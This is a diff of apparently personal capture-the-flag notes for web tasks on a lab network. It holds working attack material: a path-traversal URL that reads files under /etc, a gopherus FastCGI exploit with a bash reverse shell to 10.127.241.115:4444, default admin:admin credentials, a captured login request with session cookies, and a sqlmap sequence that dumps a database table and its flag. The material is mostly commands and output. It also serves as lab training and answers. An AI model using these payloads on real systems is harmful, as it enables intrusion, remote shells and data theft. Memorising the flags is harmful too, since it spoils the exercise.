@@ -285,15 +285,19 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 32 IP addresses (14 hosts up) scanned in 325.20 seconds
 
 
-
+**------------------------------------------------------------------------------------------------------------------------------------------------------------------------**
 
 
 TASK WEB-2-1
 http://www.edu.stf/api/read.php?file=../../../../etc/pt.flag
 
+**------------------------------------------------------------------------------------------------------------------------------------------------------------------------**
+
 
 TASK WEB-3-1
 URL -> http://127.0.0.1:9732
+
+**------------------------------------------------------------------------------------------------------------------------------------------------------------------------**
 
 
 TASK WEB-3-2
@@ -316,6 +320,8 @@ gopherus --exploit fastcgi
 bash -c "bash -i >& /dev/tcp/10.127.241.115/4444 0>&1 &"
 -----
 
+**------------------------------------------------------------------------------------------------------------------------------------------------------------------------**
+
 
 TASK-WEB-5
 get tocken and decode it on https://www.jwt.io/
@@ -336,19 +342,71 @@ go there and do admin:admin creds, then prepare for sqlmap
 nano pack
 POST /supersecretadminloginyoullneverguess.php HTTP/1.1
 Host: tokenizer.edu.stf
-User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate, br
-Content-Type: application/x-www-form-urlencoded
 Content-Length: 60
+Cache-Control: max-age=0
+Accept-Language: en-US,en;q=0.9
 Origin: http://tokenizer.edu.stf
-DNT: 1
-Connection: keep-alive
-Cookie: _gcl_au=1.1.807887967.1724594292; _ga_E9PS2EVWYS=GS1.1.1724665941.2.1.1724676481.60.0.0; _ga=GA1.1.26186061.1724594292; _clck=1nao1d7%7C2%7Cfon%7C0%7C1698; _fbp=fb.1.1724594293979.186148304756426122; PHPSESSID=p80oov368a5mo6497j22dqhbuo
+Content-Type: application/x-www-form-urlencoded
 Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://tokenizer.edu.stf/supersecretadminloginyoullneverguess.php
+Accept-Encoding: gzip, deflate, br
+Cookie: PHPSESSID=86ntcs26ocqc6jsetrbtl4vqv0
+Connection: keep-alive
 
 name=1&address=1&phone=1&email=1&plan=1&submit_search=Submit
 ----
 sqlmap -r pack --level=5 --risk=3 --dbs --batch --random-agent --threads=10 --time-sec=5 --timeout=30 --ignore-code=404
+available databases [3]:
+[*] information_schema
+[*] pg_catalog
+[*] public
+----
+sqlmap -r pack --level=5 --risk=3 --tables -D public --batch --random-agent
+Database: public
+[2 tables]
++--------------+
+| clients_data |
+| secret       |
++--------------+
+----
+sqlmap -r pack --level=5 --risk=3 --columns -D public -T clients_data --batch --random-agent
+Database: public
+Table: clients_data
+[6 columns]
++---------+---------+
+| Column  | Type    |
++---------+---------+
+| name    | varchar |
+| address | text    |
+| email   | varchar |
+| id      | int4    |
+| phone   | varchar |
+| plan    | varchar |
++---------+---------+
+sqlmap -r pack --level=5 --risk=3 --columns -D public -T secret --batch --random-agent
+Database: public
+Table: secret
+[2 columns]
++--------+--------+
+| Column | Type   |
++--------+--------+
+| flag   | bpchar |
+| id     | int4   |
++--------+--------+
+----
+sqlmap -r pack --level=5 --risk=3 --dump -D public -T secret --batch --random-agent
+Database: public
+Table: secret
+[1 entry]
++----+--------------------------------------+
+| id | flag                                 |
++----+--------------------------------------+
+| 1  | d6a600f4-df97-4aba-a872-d682826c4117 |
++----+--------------------------------------+
 
+**------------------------------------------------------------------------------------------------------------------------------------------------------------------------**
+
+
+TASK-WEB-6
